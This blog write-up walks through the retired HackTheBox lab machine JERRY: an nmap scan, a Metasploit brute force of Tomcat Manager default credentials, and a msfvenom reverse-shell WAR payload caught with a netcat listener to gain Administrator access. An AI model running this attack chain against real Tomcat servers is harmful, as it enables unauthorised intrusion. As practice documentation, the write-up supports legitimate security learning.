---
title: HTB Writeup - JERRY
published: true
---

This is the first of a series of writeups detailing my progress through the machines on [HackTheBox](https://www.hackthebox.eu/). The site is available to anyone that can solve the [puzzle](https://www.hackthebox.eu/invite) for the invite code, and has a great variety of boxes for people of any skill level to practice pentesting - as well as other puzzles and challenges.

As per the rules, these will only be for the retired machines on HTB. There are plenty of writeups just like this out on the internet, but I decided to create my own to practice documenting my approach.

JERRY was one of the first boxes I completed, and according to user reporting is near enough the most straightforward on the network, so this should be a short post! Anyway - with all that out of the way, we can get going.

### [](#header-3)Enumeration

We'll start out with a simple `nmap` scan to check for open ports, and services running on them.

<pre>
<kw>root@kali:~</kw># nmap -sV 10.10.10.95
Starting Nmap 7.70 ( https://nmap.org )
Nmap scan report for 10.10.10.95
Host is up (0.021s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
</pre>

Since it looks like this box is running an Apache Tomcat server, let's fire up metasploit with `msfconsole` and search for some applicable scanner modules that can get us some more info.

<pre>
<kw>msf5 ></kw> search path:auxiliary/scanner tomcat

Matching Modules
================

 Name                                     Description
 ----                                     -----------
 auxiliary/scanner/http/tomcat_enum       Apache Tomcat User Enumeration
 auxiliary/scanner/http/tomcat_mgr_login  Tomcat Application Manager Login Utility
</pre>

### [](#header-3)Gaining a foothold

A quick google will show us that by default, Tomcat's Manager Application is found at /manager/html - and if we put that in the search bar...

![Tomcat Application Manager Login](/assets/jerry/tomcat-login.png){:.center-image }

`tomcat_mgr_login` looks promising, then. We'll tell metasploit to use that module, and set the necessary options...

<pre>
<kw>msf5 ></kw> use auxiliary/scanner/http/tomcat_mgr_login
<kw>msf5 auxiliary(scanner/http/tomcat_mgr_login) ></kw> set RHOSTS 10.10.10.95
RHOSTS => 10.10.10.95
<kw>msf5 auxiliary(scanner/http/tomcat_mgr_login) ></kw> set RPORT 8080
RPORT => 8080
</pre>

And then execute.

<pre>
<kw>msf5 auxiliary(scanner/http/tomcat_mgr_login) ></kw> exploit

[!] No active DB -- Credential data will not be saved!
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:admin (Incorrect)
...
[-] 10.10.10.95:8080 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:tomcat (Incorrect)
[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret
</pre>

We got a login! Now we can take a look at the manager application.

![Tomcat Application Manager](/assets/jerry/tomcat-manager-app.png){:.center-image }

On first impressions, the most immediately interesting thing on the page is this:

![Tomcat Deplot WAR File](/assets/jerry/tomcat-deploy-war.png){:.center-image }

### [](#header-3)Further exploitation

It would seem that with our new manager access, we can deploy any .WAR file we want on the server! Let's get `msfvenom` to create an appropriate file.

WAR files can contain .jsp files, so some form of jsp payload should do the trick - we'll use `java/jsp_shell_reverse_tcp`, but set the output format to be 'war':

<pre>
<kw>root@kali:~/Desktop</kw># msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.51 LPORT=8080 -f war > shell.war
Payload size: 1101 bytes
Final size of war file: 1101 bytes
</pre>

The file can be uploaded now, but we still have to set up a listener on our end before the payload will have any effect. We do this with netcat, using `-l` to listen and `-p` to specify the port we used in the payload...

<pre>
<kw>root@kali:~/Desktop</kw># nc -l -p 8080
</pre>

Finally, we run /shell in the application manager, and it should connect to our listener.

<pre>
<kw>root@kali:~/Desktop</kw># nc -l -p 8080
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

<kw>C:\apache-tomcat-7.0.88></kw>
</pre>

### [](#header-3)Finishing up

After a brief poke around, we can see we have access to the Users/Administrator directory.

<pre>
<kw>C:\Users\Administrator\Desktop\flags></kw> dir

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)  27,597,131,776 bytes free

<kw>C:\Users\Administrator\Desktop\flags></kw> more "2 for the price of 1.txt"
</pre>

And we're done :)

Thanks for reading!

- <kw>j4ckdaw</kw>
